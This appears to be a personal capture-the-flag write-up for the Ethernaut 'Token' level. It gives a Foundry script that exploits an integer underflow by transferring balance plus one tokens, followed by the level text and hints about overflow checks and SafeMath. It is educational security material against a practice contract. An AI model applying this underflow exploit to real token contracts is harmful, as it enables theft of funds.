---
title: Token
---

Difficulty: ⭐⭐
Date: 1 février 2024
État: Terminé

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface Token {
  function transfer(address _to, uint _value) external returns (bool);

  function balanceOf(address _owner) external view returns (uint balance);
}

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_05");
        address publicKey = vm.envAddress("PUBLIC_KEY");

        vm.startBroadcast(deployerPrivateKey);
        Token token = Token(addr);
        uint balance = token.balanceOf(publicKey);
        console.logUint(balance);
        token.transfer(address(0), balance + 1);
        balance = token.balanceOf(publicKey);
        console.logUint(balance);

        vm.stopBroadcast();
    }
}
```

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if
you somehow manage to get your hands on any additional tokens.
Preferably a very large amount of tokens.

Things that might help:

- What is an odometer?

Overflows are very common in solidity and must be checked for with control statements such as:

```
if(a + c > a) {
  a = a + c;
}

```

An easier alternative is to use OpenZeppelin's SafeMath library that
automatically checks for overflows in all the mathematical operators.
The resulting code looks like this:

```
a = a.add(c);

```

If there is an overflow, the code will revert.
